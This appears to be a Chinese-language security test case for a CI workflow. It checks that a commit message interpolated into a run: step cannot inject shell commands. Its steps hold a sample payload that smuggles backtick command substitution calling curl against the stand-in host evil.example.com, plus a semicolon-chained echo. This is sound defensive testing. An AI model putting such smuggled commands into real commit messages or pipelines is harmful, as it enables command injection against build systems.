用例 ID:   SEC-INJECT-01-004
维度标签:   [security]
维度:      安全性
优先级:    P0
溯源意图:  INTENT-SEC-012
母意图:    —
标题:      提交信息（commit message）中的不可信输入不应通过 ${{ }} 直接插入 run: 导致命令注入

前置条件:
  - 仓库配置了 push 触发器
  - 提交信息中包含 shell 注入 payload
  - workflow 直接使用 `${{ atomgit.event.head_commit.message }}` 插入 run

操作步骤:
  1. 创建提交，提交信息为：
     ```
     fix bug `curl evil.example.com`; echo INJECTED_BY_COMMIT; #
     ```
  2. 推送该提交触发 workflow
  3. workflow 中的 `run: echo "${{ atomgit.event.head_commit.message }}"` 被执行
  4. 观察日志中是否出现 `INJECTED_BY_COMMIT` 或 curl 请求的执行

预期结果:
  - 提交信息中的反引号命令替换不应被执行
  - 分号后的 `echo INJECTED_BY_COMMIT` 不应作为独立命令执行
  - 提交信息中的换行符不应导致意外的命令分隔
  - 日志中不应出现注入命令的执行痕迹

验证点:
  - [负向] 日志中不应出现 `INJECTED_BY_COMMIT`（注入命令不应被执行）
  - [负向] 提交信息中的反引号命令替换不应被执行
  - [负向] 提交信息中的分号不应导致命令分隔执行
  - [负向] 提交信息中的换行符不应导致新命令启动

清理:      fixture
